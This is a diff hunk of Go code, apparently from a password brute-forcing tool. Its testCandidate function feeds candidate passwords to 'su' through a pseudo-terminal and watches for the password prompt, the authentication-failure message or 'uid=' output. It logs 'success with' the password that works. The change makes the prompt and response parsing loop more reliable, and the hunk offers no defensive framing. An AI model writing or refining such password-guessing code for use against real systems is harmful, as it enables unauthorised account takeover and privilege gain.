@@ -89,14 +89,28 @@ func testCandidate(username, candidate string, pty, tty *os.File) {
 	}
 
 	buffer := make([]byte, 100)
-	pty.Read(buffer) // text 'Password: '
-	pty.Write([]byte(candidate + "\n"))
-	pty.Read(buffer)         // new line
-	n, _ := pty.Read(buffer) // either id text or failure
 
-	if n > 0 && strings.HasPrefix(string(buffer), "uid=") {
-		log.Printf("success with %s\n", candidate)
-		os.Exit(0)
+	n, _ := pty.Read(buffer)
+	for {
+		result := string(buffer[:n])
+		if strings.HasPrefix(result, "Password:") {
+			break
+		}
+		n, _ = pty.Read(buffer)
+	}
+
+	pty.Write([]byte(candidate + "\n"))
+
+	n, _ = pty.Read(buffer)
+	for {
+		result := string(buffer[:n])
+		if strings.HasPrefix(result, "su: Authentication failure") {
+			break
+		} else if strings.HasPrefix(result, "uid=") {
+			log.Printf("success with %s\n", candidate)
+			os.Exit(0)
+		}
+		n, _ = pty.Read(buffer)
 	}
 }
 
